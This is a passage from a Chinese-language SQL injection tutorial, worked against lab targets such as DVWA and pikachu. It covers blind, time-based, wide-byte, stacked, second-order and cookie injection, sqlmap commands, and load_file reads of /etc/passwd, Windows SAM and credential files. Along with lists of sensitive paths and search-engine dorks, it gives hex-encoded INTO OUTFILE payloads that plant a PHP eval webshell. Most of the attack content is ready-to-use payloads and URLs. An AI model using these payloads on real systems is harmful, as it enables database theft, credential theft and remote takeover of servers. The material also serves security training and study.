不存在）</p><p>MySQL命令端，输入语句：select ascii(substr(database(),1,1))&gt;x;   ，通过对比 ascii 长度，判断出数据库名的第一个字符。</p><p><strong>注：substr()函数</strong></p><p>substr(string,start,length)</p><p>string(必需)规定要返回其中一部分的字符串，start(必需)规定在字符串的何处开始，length(可选)规定被返回字符串的长度。</p><p>那么通过这个方法，虽然只能通过判断单个字符，我们同样可以使用 length 来判断表名的长度，判断出长度后就能多次输入 payload 来爆破出每一个表名的字符，</p><ol><li><p>MySQL 命令端，输入语句：</p><p>select length(database())&lt;x;    x是长度值 1/2/3… 以此类推，返回1为真，返回0为假，以此来判断长度。</p></li><li><p>pikachu 平台</p><p>我们构造语句，如果返回1，就会爆出选择的信息；如果爆出0，就会返回“你输入的 username 不存在”。按照之前的逻辑，输入 SQL 语句：</p><p>vince’ and ascii(substr(database(),1,1))=112#  ，通过这个方法就能得到后台数据库的名称的第一个字符的 ascii 码。同之前的办法，我们也可以获得 information_schema.tables 里面的数据。但在实际操作中通常不会使用手动盲注的办法，可以使用 sqlmap 等工具来增加盲注的效率。</p><p>1）查询数据表个数：vince’ and (select count(table_name) from information_schema.tables where table_schema=’pikachu’)=5#                （5的时候没有保错）</p><p>2）查询第一个表名的长度：vince’ and length(substr((select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1),1))=8#              （8 的时候没有保错）</p><p>3）查询第一个表名的第一字母：vince’ and ascii(substr((select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1),1))=104#</p><p>4）查询第一个表名的第二字母：vince’ and ascii(substr((select table_name from information_schema.tables where table_schema=’pikachu’ limit 0,1),2))=116#              （注：0代表第几个表，1代表字符长度，2代表第几个字母）</p><p>5）下面的列也是同理</p></li></ol>        <h3 id="1-6-10-Base-on-time-时间型-盲注">          <a href="#1-6-10-Base-on-time-时间型-盲注" class="heading-link"><i class="fas fa-link"></i></a>1.6.10. Base on time(时间型)盲注</h3>      <p>到 base on time 盲注下，输入上个演示中设置好的 payload：vince’ and ascii(substr(database(),1,1))=112#    ，返回的信息发现不存在注入点，那这样就不能进行注入了？但其实可以通过后端的执行时间来进行注入。这里会用到 payload：vince’ and sleep(x)#</p><p>基于时间的延迟，构造一个拼接语句：vince’ and if(substr(database(),1,1)=’x’,sleep(10),null)#    其中’x’ 中的 x 为猜测字符，如果猜测正确，那么就会响应10秒；如果错误，就会立刻返回错误；这样我们就可以逐级向下获取数据。（弊端：这个很麻烦，得一个个逐级向下判断）</p><p>它的拼接语句和 布尔型的有点类似，我决定也差不多就是多了个 if 的判断条件，从而利用 sleep 来判断是否正确。</p>        <h3 id="1-6-11-宽字节注入">          <a href="#1-6-11-宽字节注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.11. 宽字节注入</h3>      <p>下列使用了URL 编码转换</p><p>当我们把 php.ini 文件里面的 magic_quotes_gpc 参数设为 ON 时，所有  ‘（单引号），”（双引号），\（反斜杠）和 null 字符都会被自动加上一个反斜杠进行转义。还有很多函数有类似的作用，如：addslashes()，mysql_escape_string()，mysql_real_escape_string()等。另外还有 parse_str() 后的变量也受 magic_quotes_gpc 的影响。目前大多数的主机都打开了这个选项，并且很多程序员也注意使用上面那些函数去过滤变量，这看上去很安全，很多漏洞查找者或者工具遇到这些函数过滤后的变量直接放弃，但是就在他们放弃的同时也放弃了很多致命的漏洞。</p><p>其中 \ 的十六进制是 %5C ，当我们在 \ 前面加上 %df 的时候，最终就会变成 運，如果程序默认的字符集是 GBK 等宽字节字符集，则 MySQL 用 GBK 的编码时，会认为 %df 是一个宽字符，也就是 <strong>運</strong>；也就是说：<code>%df\&#39;</code>= %df%5c%27=運’ ，有了单引号就好注入了。</p><p>‘=======&gt;&#39; 单引号转义后占两个字节，所以我们需要通过 繁体字%df 构造两个字节，最终用 <strong>運</strong> 干掉了 <code>\</code> ，也就是说被 <strong>運</strong> 占领了 \ ，所以在最后页面显示 SQL 语句的地方不会显示 \ 。</p><p>(小提示：数字和字母占一个字节，汉字占两个字节)</p><p>哪些地方没有魔术引号的保护？</p><ol><li><p><code>$_SERVER</code> 变量</p><p>PHP5 的 <code>$_SERVER</code> 变量缺少 magic_quotes_gpc 的保护，导致近年来 X-Forwarded-For 的漏洞猛爆，所以很多程序员考虑过滤 X-Forwarded-For(代理)，但是其他变量呢？</p></li><li><p><code>getenv()</code> 得到的变量（使用类似 <code>$_SERVER</code> 变量 ）</p></li><li><p><code>$HTTP_RAW_POST_DATA</code> 与 PHP 输入，输出流</p></li></ol><p>**总结： **</p><p>但我们输入 id=值后，显示的 SQL语句发现自动加上了 \ ，就可以通过 %df 来使得其成为繁体字 <strong>運</strong> 。</p>        <h3 id="1-6-12-堆叠注入">          <a href="#1-6-12-堆叠注入" class="heading-link"><i class="fas fa-link"></i></a>1.6.12. 堆叠注入</h3>      <p>堆叠注入为攻击者提供了很多控制权，与仅限于SELECT语句的UNION联合查询攻击不同，<strong>堆叠注入可以用于执行任何SQL语句。</strong></p><p><strong>堆叠注入原理</strong></p><p>在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。</p><p>举个堆叠注入攻击的例子：</p><p>执行查询时，第一个语句执行信息查询，第二个语句则将表user的所有内容给删除了，如下代码：</p><p><code>mysql&gt; select * from users where id =1;delete from users;</code></p><p>注入形式：<code>1&#39;;show databases;show tables;#</code></p><p><strong>堆叠注入的局限性</strong></p><p>堆叠注入并不是在每种情况下都能使用的。大多数时候，因为API或数据库引擎的不支持，堆叠注入都无法实现。</p>        <h2 id="2-1-二阶-SQL-注入">          <a href="#2-1-二阶-SQL-注入" class="heading-link"><i class="fas fa-link"></i></a>2.1. 二阶 SQL 注入</h2>      <p>一种特别的有意避开过滤的方法与二阶 SQL 注入(second-order SQL injection) 有关。当数据首次插入数据库中时，许多应用程序能够安全处理这些数据。但是，一但数据存储在数据库中，随后应用程序本身或其他后端进程可能会以危险的方式处理这些数据。许多这类应用程序并不像面向因特网的主要应用程序一样安全，却拥有较高权限的数据库账户。</p><ol><li><p>在一些应用程序中，用户输入在到达时通过转义单引号来进行确认，在前面搜索书籍的示例中，这种方法明显有效。当用户输入搜索项 0’ Reilly 时，应用程序执行以下查询：</p><p>SELECT author,title,year FROM books WHERE publisher=’0’ ‘Reilly’（这样SQL注入语句就可以写在 Reilly 的地方了）</p><p>在这个查询中，用户提交的单引号被转义成两个单引号，因而传递给数据库的搜索项与用户最初输入的表达式具有相同的字符含义。</p></li><li><p>与单引号配对方法有关的问题出现在更复杂的情形中，此时同一个数据项被提交给几个SQL查询，然后写入数据库被几次读取。这是证明简单输入确认相对于边界确认存在不足的一个示例。<br>回到前面那个允许用户自我注册并且在一个INSERT语句中存在SQL注入漏洞的应用程序。假设开发者将修复出现在用户数据中的所有单引号配对导致的漏洞。注册用户名fool来建立如下查询，它不会在数据库中造成问题：</p><p>INSERT INTO users (username,password,ID,privs)VALUES(‘foo’’’,’secret’,2248,1)</p></li><li><p>目前为止一切正常。然而，假设应用程序还执行密码修改功能，那么只有通过验证的用户才能够访问这项功能，而且为了加强保护，应用程序要求用户提交原始密码。然后应用程序从数据库中提取用户的当前密码，并对两个字符串进行比较，核对用户提供的密码是否正确。要完成核对任务，它首先要从数据库提取用户的用户名，然后建立如下查询:<br>SELECT password FROM users WHERE username=’foo’’</p></li><li><p>因为保存在数据库中的用户名是字面量字符串foo’ ，当应用程序提出访问要求时，数据库即返回这个值，只有在字符串被传送给数据库时才使用配对的转义序列。因此，当应用程序重复使用这个字符串并将它嵌人到另一个查询中时，就会造成一个 SQL注人漏洞，用户最初的恶意输人就被嵌人到查询中。当用户尝试修改密码时，应用程序返回以下消息，暴露了上述缺陷:</p><p>Unlosed quotation mark before the character string’foo</p></li><li><p>要利用这种漏洞，攻击者只需注册一个包含专门设计的输入用户名，然后尝试修改密码。例如，如果注册如下用户名：</p><p>‘or 1 in(select password from users where username=’admin’)–</p></li><li><p>注册步骤将会被应用程序安全处理。如果攻击者尝试修改密码，他注入的查询就会执行，导致生成以下消息，泄露管理员密码：</p><p><code>Microsoft OLE DB Provider for ODBC Drivers error&#39;80040e07&#39;</code></p><p><code>[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting</code></p><p><code>the varchar value&#39; fm69&#39; to a column of data type int.</code></p></li></ol><p>攻击者已经成功避开旨在阻止 SQL注入攻击的输入确认，现在他能够在数据库中执行任意查询并获得查询结果。</p>        <h2 id="2-2-Cookie-注入">          <a href="#2-2-Cookie-注入" class="heading-link"><i class="fas fa-link"></i></a>2.2. Cookie 注入</h2>      <p>大家都知道注入分为：GET，POST，COOKIE注入，当一个站增加了防注入程序后，很多朋友都会放弃，其实可以试试 COOKIE注入，下面实例就是对 GET 和 POST 做了防注入，但忘了 COOKIE 注入。在演示前先了解一下 ASP 和 PHP 数据提交方式。</p><p>ASP：request（全部接受），request.querystring（接受 get ），request.form（接受 post )，request.cookie cookie（接受 cookie ）</p><p>PHP：<code>$_REQUEST</code>（全部接受），<code>$_GET</code>和<code>$_POST</code>（接受 post ），<code>$_cookie</code>（接受 cookie ）</p>        <h3 id="2-2-1-实例">          <a href="#2-2-1-实例" class="heading-link"><i class="fas fa-link"></i></a>2.2.1. 实例</h3>      <p><strong>方法一：</strong></p><p>用 Burp 进行拦截</p><p>把 GET 头中的 id=n 后面加 ‘ ，然后 send ，如果接受后的显示 script 这类的字样出现，说明被拦截了；然后把 id=n’ 删除，然后添加到 cookie 中，先在原来的末尾加 ; 然后把这个 id=n’ 添加到末尾</p><p>然后，后面就可以进行一些注入查询，例如：</p><p>;id=n’%20order%20by%201,2,3…进行字段长度的查询之类的，然后再进行 union select 的联合查询</p><p>注：content-length：16xxx 是一般正确的数据包长度，像什么1524之类的是错误的</p><p><strong>方法二：</strong></p><p>通过注入中转器工具进行 cookie 注入，这个工具针对于 ASP ，PHP 一般用 sqlmap。</p><p>cookie 注入时：</p><p>注入键名：id=（这里也有可能是别的名称）</p><p>注入 URL 地址：…asp</p><p>POST 提交值：jmdcw=n（这里的 n 是id 后面的参数）</p><p>当生成 ASP 后，就会多出来一个文件，这个就是注入文件</p><p>我们再在 URL 中访问时，就不是id=参数值，而是 jmdcw=参数值。</p><p><strong>方法三：</strong></p><p>利用 Pangolin 穿山甲 SQL注入工具</p><p>直接在 URL 中填写注入站点，然后 cookie 注入就可以了。</p><p><strong>方法四：</strong></p><p>利用 Sqlmap 注入：</p><p><strong>get注入：</strong>进入 Sqlmap 的物理路径进行 cmd ，&gt;sqlmap.py -u “注入站点.asp?id=参数值”</p><p><strong>post注入：</strong>进入 Sqlmap 的物理路径进行 cmd ，&gt;sqlmap.py -u “注入站点.asp” –data “id=参数值”</p><p><strong>cookie注入：</strong>进入 Sqlmap 的物理路径进行 cmd ，&gt;sqlmap.py -u “注入站点.asp” –cookie “id=参数值” –level 2   （默认 level 是1，当 cookie 注入时要&gt;=2，最高是5）</p>        <h2 id="3-1-MySQL-实战-Webshell">          <a href="#3-1-MySQL-实战-Webshell" class="heading-link"><i class="fas fa-link"></i></a>3.1. MySQL 实战 Webshell</h2>      <p>以下操作使用到 DVWA</p>        <h3 id="3-1-1-使用-order-by-查询字段">          <a href="#3-1-1-使用-order-by-查询字段" class="heading-link"><i class="fas fa-link"></i></a>3.1.1. 使用 order by 查询字段</h3>      <p>我们需要通过 MySQL 语句进一步的进行测试，开始使用 order by ，order by 语句可以对查询结果进行排列，上面的语句中有两列，使用 order by 语句可以按照第一列 first_time 或者第二列 last_name 对结果进行排列。假如我们想根据第三列结果进行排序，因为查询语句中不存在第三列，就会产生报错：</p><p>ERROR 1054 (42S22)：Unknown column ‘3’ in ‘order clause’</p><p>当我们使用 order by 2 的时候没有产生任何错误，而是用 order by 3的时候产生报错就说明数据库中只用两列，通过这种方法我们可以使用 order by 语句猜测数据库表中的列数。</p><ol><li><p>MySQL 命令行输入：</p><p>select first_name,last_name from user where user_id=” order by 2+-+’</p></li><li><p>DVWA 中 SQL注入，输入：</p><p>1’ order by 1,2 –</p></li></ol>        <h3 id="3-1-2-使用联合查询来查询当前数据库，用户，版本信息">          <a href="#3-1-2-使用联合查询来查询当前数据库，用户，版本信息" class="heading-link"><i class="fas fa-link"></i></a>3.1.2. 使用联合查询来查询当前数据库，用户，版本信息</h3>      <p>继续构造 union select 语句，来查询正在使用中的用户 user()，数据库 database()，数据库版本 version()，服务器操作系统 @@version_compile_os，用以下语句：</p><p>‘union select user(),database()+–+（–相当于#，注释；+是空格）</p>        <h3 id="3-1-3-获取表名，字段，值">          <a href="#3-1-3-获取表名，字段，值" class="heading-link"><i class="fas fa-link"></i></a>3.1.3. 获取表名，字段，值</h3>      <p>前面说过 MySQL5.0 以上，information_schema 存储所有数据库下的表名和列名信息，下面我们就来查询 information_schema 数据库名下的表名 tables 的信息（条件：table_schema=0x64767761 dvwa的十六进制）</p><p>information_schema.tables：information_schema 数据库名下表名 tables 记录所有数据库名下的所有表名信息。</p><p><span class="exturl"><a class="exturl__link" href="http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39;">http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39;</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761+–+&amp;Submit=Submit</p>        <h3 id="3-1-4-MySQL-root-用户密码存储位置">          <a href="#3-1-4-MySQL-root-用户密码存储位置" class="heading-link"><i class="fas fa-link"></i></a>3.1.4. MySQL root 用户密码存储位置</h3>      <p>数据库最高权限是 root 密码保存在 MySQL 数据库 user 表里，密码是采用 MySQL5.0 特有的加密，通过 cmd5 网站进行解密或通过 cain 这类专业可以对 MySQL hash 破解，所以对数据库做安全的时候无论如何不能给网站 root 权限，一定要给一个普通用户权限。</p>        <h3 id="3-1-5-对服务器文件进行读写操作（前提条件）">          <a href="#3-1-5-对服务器文件进行读写操作（前提条件）" class="heading-link"><i class="fas fa-link"></i></a>3.1.5. 对服务器文件进行读写操作（前提条件）</h3>      <ol><li><p>使用 into outfile 需要有以下条件：</p><p>1）需要知道远程目录</p><p>2）需要远程目录有写权限</p><p>3）需要数据库开启 secure_file_priv</p></li><li><p>数据库开启 secure_file_priv</p><p>into outfile 可以将 select 的结果写入到指定目录下的 txt 中，但需要数据库开启 secure_file_priv，怎么开启 secure_file_priv。</p><p>1）在 MySQL 安装目录的 php.ini 文件中的 [mysqld] 添加 secure_file_priv=’’;  </p><p>2） 然后以管理员的身份运行 cmd，进入 mysql/bin 停止 mysql 服务：net stop mysql；</p><p>3）重新启动 mysql 服务：net start mysql ；</p><p>4）登入 mysql：mysql -u root -p enter password:password ；</p><p>5）执行命令：show variables like ‘%secure%’ ；查看 secure_file_priv 的值（这里已经将 secure_file_priv 的值设为空，但正常显示为 NULL 和文件路径，只有value 下对应的为空才能读写操作），显示以下界面说明可以对服务器进行读写操作。</p></li><li><p>通过联合查询对服务器进行读写操作</p><p>1）使用联合查询语句构造，利用注入读取 /etc/passwd 文件（Linux系统）</p><p>‘UNION SELECT 1,load_file(/etc/passwd)+–+</p><p>2）使用联合查询语句构造，利用注入读取 c:\1.txt（Windows系统）</p><p><code>&#39;UNION SELECT 1,load_file(&#39;c:\\1.txt&#39;)+--+</code>或者</p><p><code>union select 1,load_file(&#39;c:/1.txt&#39;)+--+</code></p><p>注：“ \ ” （编程里面 “ \ ” 转义,为什么要俩个，因为有一个要被转义）</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file(&#39;c:\\boot.ini&#39;)+--+&amp;Submit=Submit</code></p><p>3）如果出现以下报错：</p><p><code>Query Error:SELECT CID,TITLE FROOM CMS_CONTENTINDEX WHERE TID=25950\&#39; AND 1=2 UNION SELECT LOAD_FILE(&#39;C:\\BOOT.INI\&#39;),2</code></p><p>显然，在 “php.ini” 配置文件中 magic_quotes_gpc 为 on 或在接受参数的时候用了 addslashes()函数，单引号就会被自动转义成 \ ‘ ，因此函数未能争取执行功能，要绕过此过滤，可将 <code>c:\\boot.ini</code> 转为十六进制：<code>0x633A5C5C626F6F742E696E69</code>，转换后再提交</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file(0x633A5C5C626F6F742E696E69)+--+&amp;Submit=Submit</code> 或者</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1 and 1=2 union select 1,load_file(0x633A5C5C626F6F742E696E69)+--+&amp;Submit=Submit</code></p><p>4）如果想要对服务器进行写操作，直接用下面这条语句进行操作：</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%20&#39;568311803&#39;,2 into outfile &#39;c:/muma.txt&#39;+--+&amp;Submit=Submit</code></p><p>写一个一句话木马试试：</p><?php @eval($_POST['chopper']);?><p> 转为十六进制：<code>0x3C3F70687020406576616C28245F504F53545B2763686F70706572275D293B3F3E</code></p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%200x3C3F70687020406576616C28245F504F53545B2763686F70706572275D293B3F3E,2 into outfile &#39;c:/muma.txt&#39;+--+&amp;Submit=Submit</code></p><p>为什么要把一句话转为十六进制，因为一句话木马中也有单引号，再用单引号会引起混淆。所以得出结论：如果用编码就不要用单引号，用单引号就不要用编码。</p></li></ol>        <h3 id="3-1-6-怎么获取-Web-路径">          <a href="#3-1-6-怎么获取-Web-路径" class="heading-link"><i class="fas fa-link"></i></a>3.1.6. 怎么获取 Web 路径</h3>      <p>不管是 root 权限还是普通用户权限要对服务器进行读写我们需要网站路径才能得到 webshell.</p><ol><li><p>一般可以在变量后面加上单引号，改变参数类型，怎加参数位数等来造成 MySQL 数据库出错，爆出 Web 物理路径。</p></li><li><p>通过扫描器扫 web 服务器遗留文件 php.php，info.php，phpinfo.php，test.php</p></li><li><p>利用搜索引擎来查找 web 目录。搜索引擎有时候会对网站页面进行快照抓取，包括脚本出错页面，因此可以利用搜索引擎查找网站的出错信息，从而获得网站的物理路径。可在 Google 或 百度中搜索 <code>&quot;mysql site:***.com&quot;</code> 或 <code>&quot;warning site:***.com,error site:***.com.cn&quot;</code>等。</p><p>这里使用 <code>&quot;error site:***.com&quot;</code> 关键字进行查询，从搜索结果中得到了网站的物理路径为 “E:\pujing2015”</p></li><li><p>漏洞爆路径，例如通过网站后台查看网站 Web 路径，CC攻击爆路径 等。</p></li><li><p>通过配置文件找到网站路径，在百度里面输入 *** 配置文件，如：IIS6.0 配置文件，可以找到：<code>C:\\windows\\system32\\inetsrv\\MetaBase.xml</code> 和 <code>C:\windows\system32\inetsrv\MetaBase.bin</code> ，这两个配置文件（小技巧：在百度里输入：load_file() 常用敏感信息，就可以找到别人入侵过程中总结的常用敏感文件路径）</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select%201,load_file(C:\\WINDOWS\\system32\\inetsrv\\MetaBase.xml)+--+&amp;Submit=Submit</code></p><p>然后查看网页的源代码，就可以得到服务器上所有网站的路径。</p></li></ol>        <h3 id="3-1-7-利用-SQL-注入写入-webshell">          <a href="#3-1-7-利用-SQL-注入写入-webshell" class="heading-link"><i class="fas fa-link"></i></a>3.1.7. 利用 SQL 注入写入 webshell</h3>      <p>假设我们通过 phpinfo 文件知道了网站的物理地址，接下来我们通过使用 union select 语句写入 webshell ，写入需要你有写入的权限。</p><p>‘union select 1,’ ‘INTO OUTFILE ‘/var/www/dvwa/cmd.php’+–+   这种反斜杠/本地没测试，大家测试一下，推荐大家用两个反 <code>\\</code> ，例如：</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1&#39; union select &quot;&lt;?php @eval($_POST[&#39;chopper];?&gt;&quot;,2 into outfile&quot;c:\\php\\htdocs\\dvwa\\123.php&quot;+--+&amp;Submit=Submit</code></p>        <h2 id="3-2-MySQL-获取-web-路径方法总结">          <a href="#3-2-MySQL-获取-web-路径方法总结" class="heading-link"><i class="fas fa-link"></i></a>3.2. MySQL 获取 web 路径方法总结</h2>      <p>在 MySQL 注入中，利用 load_file()函数读取网页文件源代码时，首先需要获取网站的路径。网站路径可以通过以下几种方法获得。</p>        <h3 id="3-2-1-直接在出错信息中显示-Web-路径">          <a href="#3-2-1-直接在出错信息中显示-Web-路径" class="heading-link"><i class="fas fa-link"></i></a>3.2.1. 直接在出错信息中显示 Web 路径</h3>      <p>在注入点处加单引号，或者修改提交变量类型，让查询语句出错，从出错信息中往往可以爆出网站 Web 物理路径</p>        <h3 id="3-2-2-load-file-char-47-列出-freebsd-目录">          <a href="#3-2-2-load-file-char-47-列出-freebsd-目录" class="heading-link"><i class="fas fa-link"></i></a>3.2.2. load_file(char(47)) 列出 freebsd 目录</h3>      <p>由于 load_file()函数相当于 Linux 系统中的 cat() 函数，在某些 FreeBSD，Sunos 系统中用 “ cat/ “ 命令可以列出根目录。字符 “ / “ 的 ASCII 码是47 ，在 SQL 注入中，可利用 load_file(char(47)) 直接列出 FreeBSD 等 Linux 系统的文件夹目录。</p>        <h3 id="3-2-3-Linux-的-“-etc-passwd”-文件中的工作目录">          <a href="#3-2-3-Linux-的-“-etc-passwd”-文件中的工作目录" class="heading-link"><i class="fas fa-link"></i></a>3.2.3. Linux 的 “/etc/passwd” 文件中的工作目录</h3>              <h3 id="3-2-4-读取-apache-的配置文件-“httpd-conf”-，获取-web-路径">          <a href="#3-2-4-读取-apache-的配置文件-“httpd-conf”-，获取-web-路径" class="heading-link"><i class="fas fa-link"></i></a>3.2.4. 读取 apache 的配置文件 “httpd.conf” ，获取 web 路径</h3>      <p>PHP 网站程序通常都是通过 apache 提供服务的，apache 的配置文件 “httpd.conf” 中包含了网站物理路径，可通过读取该文件获得 Web 路径。</p><p>在 Linux 系统中，可以利用 load_file() 尝试读取以下路径查看 “apache” 配置文件：</p><ol><li>/etc/init.d/apache</li><li>/etc/init.d/apache2</li><li>/etclhttpd/httpd.conf</li><li>/etc/apache/apache.conf</li><li>/etc/apache2/apache2.conf</li><li>/etc/apache/httpd.conf</li><li>/etc/apache2/httpd.conf</li><li>/usr/local/apache/conf/httpd.conf</li><li>/usr/local/apache2/conf/httpd.conf</li><li>/opt/apache/conf/httpd.conf</li><li>/home/apache/httpd.conf</li><li>/etc/apache2/sites-available/default</li></ol><p>主要看管理员把服务器搭建在什么地方，如果是保持默认的话是前两个，比较好找。</p><p>在 Windows 系统中，可以尝试读取以下路径查看 apache 配置文件：</p><ol><li>C:\Program Files\Apache Group\Apache\conf\httpd.conf</li><li>C:\Program Files\Apache Group\Apache2\conf\httpd.conf</li><li>C:\Program Files\Apache Software Foundation\Apache2.2\conf\httpd.conf</li><li>C:\apache\confthttpd.conf</li></ol><p>也可将C盘换成 D,E,F 盘进行尝试。</p>        <h3 id="3-2-5-利用-load-file-读取各种配置文件">          <a href="#3-2-5-利用-load-file-读取各种配置文件" class="heading-link"><i class="fas fa-link"></i></a>3.2.5. 利用 load_file() 读取各种配置文件</h3>      <p>在 MySQL 注入中，load_file() 函数除了用于读取网页脚本程序源代码外，我们还可以用来读取其他各种敏感的配置文件，方便获得 WebShell 或进行提权。</p><ol><li><p>load_file() 读取服务器配置文件</p><p>在前面讲解了利用 load_file() 函数读取 “apache” 配置文件，从而获得 Web 物理路径外，还可以利用此函数读取网站中的其他的重要的配置文件，获得更多敏感信息。</p><p>/usr/local/app/apache2/conf/extra/http-vhosts.conf        虚拟网站设置</p><p>/usr/local/app/php5/lib/php.ini        php相关设置</p><p>/etc/sysconfig/iptables         防火墙规则策略</p><p>/etc/rsyncd.conf            同步程序配置</p><p>/etc/sysconfig/network-script/ifcfg-eth0           查看IP</p><p>/etc/redhat-release             系统版本</p><p>/etc/issue             系统版本</p><p>/etc/issue.net                系统版本</p><p>/usr/local/resin/conf/resin.conf               查看 Linux 系统配置的 JSP 虚拟主机</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf           查看 RESIN 3.0.22 配置文件</p><p>/usr/local/resin-3.0.22/conf/resin.conf           查看 RESIN 3.0.22 配置文件</p><p>c:\mysql\data\mysql\user.MYD              存储了”mysql.user”表中的数据库链接密码</p><p>c:\program files\rhinosoft.com\serv-u\servudaemon.ini             FTP 软件配置文件，存储虚拟主机网站路径和密码</p><p>c:\program files\serv-u\servudaemon.ini             FTP 软件配置文件，存储虚拟主机网站路径和密码</p><p>c:\program files\mysql\my.ini                Mysql 配置文件</p><p>c:\windows\my.ini                Mysql 配置文件</p><p>c:\windows\system32\inetsrv\metabase.xml              IIS 配置文件</p><p>c:\resin\conf\conf\resin.conf                查看 JSP 网站 “resin” 文件配置信息</p><p>c:\resin-3.0.14\conf\conf\resin.conf                查看 JSP 网站 “resin” 文件配置信息</p></li><li><p>load_file() 读取二进制文件</p><p>除了读取文本类型的文件外，load_file() 还可以用来读取系统中的二进制文件，例如个各种密码存储在配置文件中。</p><p>c:\windows\repair\sam               windows 系统初次安装时的密码</p><p>c:\program files\serv-u\servuadmin.exe                   serv-U 6.0 及之前版本的管理员密码文件</p><p>c:\documents and setting\all users\application data\symantec\pcanywhere*.cif                  pcanywhere 登录密码文件</p><p>只要 MySQL 注入点处的账号权限足够，那么 load_file() 函数就可以读取任何文件。但是需要注意的是，由于浏览器编码不能完全显示二进制编码文件，因此需要使用 hex() 函数将 load_file() 函数读出的二进制文件转为十六进制显示在网页上。在将网页中显示的十进制代码复制到本地后，通过转换成二进制文件才能加以利用。</p></li><li><p>load_file() 函数读取文件时不可忽视的问题</p><p>在上一个案例中，读取网页源代码时在网页中未能正常显示一些代码内容，这是由于网页源代码中包含一些特殊的字符，如：“&gt;”,“&lt;” 之类的，因此导致在返回源代码内容时显示为了网页效果，而不是真实的代码内容。因此，除了通过查看源代码外，还可以考虑在返回代码时替换一些特殊的字符，从而令网页中正常显示源文件代码内容。（&lt;:60   &gt;:62)</p><p>可在 load_file()函数使用时调用如下形式：</p><p>replace(load_file(char(文件路径十六进制代码)),char(60),char(32))  ：这句话代码的意思是，将返回文件内容中的 “&lt;” 替换成了空格，这样就可以屏蔽网页效果，而查看到真实的网页内容了。</p><p>例如，在上一个案例中，采用替换字符的方式读取文件，提交如下链接：</p><p><code>http://192.168.133.129/dvwa/vulnerabilities/sqli/?id=1%27%20union%20select replace(load_file(文件路径十六进制形式),char(60),char(32)),2+--+&amp;Submit=Submit</code></p><p>页面中返回的就是源代码内容，而不再显示网页形式了。</p></li></ol>        <h1 id="二，Access-数据库注入攻击基本技术">          <a href="#二，Access-数据库注入攻击基本技术" class="heading-link"><i class="fas fa-link"></i></a>二，Access 数据库注入攻击基本技术</h1>      <p>Access 注入攻击针对于那些小网站搭建的，访问流量小的。</p>        <h2 id="4-1-爆出数据库类型">          <a href="#4-1-爆出数据库类型" class="heading-link"><i class="fas fa-link"></i></a>4.1 .爆出数据库类型</h2>      <p>SQL server 有一些系统变量和系统表，如果服务器 IIS 提示没有关闭，并且 SQL server 返回错误提示的话，可以直接从出错信息中获取判断数据库的类型（后面会详细讲解如何突破 IIS 提示被关闭）</p>        <h3 id="4-1-1-内置变量爆数据库类型">          <a href="#4-1-1-内置变量爆数据库类型" class="heading-link"><i class="fas fa-link"></i></a>4.1.1. 内置变量爆数据库类型</h3>      <p>‘User’ 是 SQL server 的一个内置变量，它的值是当前连接的用户名，其变量类型为 “nvarchar” 字符型，通过提交查询该变量，根据返回的错误信息即可得知数据库类型，方法是在注入点之后提交如下语句：</p><p>and user&gt;0</p><p>该查询会将 user 对应的 nvarchar 型值与 int 数字型的0对比，两个数据类型不一致，因此会返回错误信息。</p><p>如果提示如下错误信息：</p><p>Mircrosoft OLE DB Provider for SQL server 错误 ‘80040e21’</p><p>将 nvarchar 值 ‘****’ 转换为 int 列时发生语法错误。</p><p>/home/yz/yu/show.asp</p><p>则可以判断时 MS SQL 数据库。如果采取的是 Access 数据库的话，那么提示信息则会如下显示：</p><p>Server Error in ‘/‘ Application    在将 nvarchar 值 转换成数据类型 int 时失败</p>        <h3 id="4-1-2-内置数据表爆数据库类型">          <a href="#4-1-2-内置数据表爆数据库类型" class="heading-link"><i class="fas fa-link"></i></a>4.1.2. 内置数据表爆数据库类型</h3>      <p>如果服务器 IIS 不允许返回错误提示，通常可以通过数据库内置的系统数据表来进行判断。在注入点提交如下查询语句：</p><p>and (select count(*) from sysobjects)&gt;=0</p><p>and (select count(*) from msysobjects)&gt;=0</p><p>Access 存在系统表[msysobjects]，不存在 “sysobjects” 表。因此如果数据库采用的是 Access ，会返回如下提示错误信息：</p><p>Mircrosoft OLE DB Provider for ODBC Drivers 错误 ‘80040e37’</p><p>/home/yz/yu/show.asp，行8</p><p><code>[Microsoft][ODBC Microsoft Access Driver]Microsoft Jet</code>数据库引擎找不到输入表或查询 “sysobjects” 。确认它是否存在，以及它的名称的拼写是否正确。</p><p>在 MS SQL Server：存在系统表 [sysobjects]，不存在[msysobjects]系统表，因此会返回如下错误提示信息：</p><p>Server Error in ‘/‘ Application</p><p>系统表 ‘O’ 无效            #存在系统表 [sysobjects]</p><p>系统表 ‘msysobjects’ 无效                 #不存在[msysobjects]</p>        <h2 id="4-2-猜测数据库名">          <a href="#4-2-猜测数据库名" class="heading-link"><i class="fas fa-link"></i></a>4.2.猜测数据库名</h2>      <p>可在注入点后提交如下语句进行查询：</p><p>and exists(select * from 数据库表名)       或者</p><p>and (select count(*) from 数据库表名)&gt;=0</p><p>上面的语句是判断数据库中是否存在指定数据库表名。如果页面返回出错，那么可更替其他常见数据库表名继续进行查询，</p>        <h2 id="4-3-猜测字段名及字段长度">          <a href="#4-3-猜测字段名及字段长度" class="heading-link"><i class="fas fa-link"></i></a>4.3. 猜测字段名及字段长度</h2>      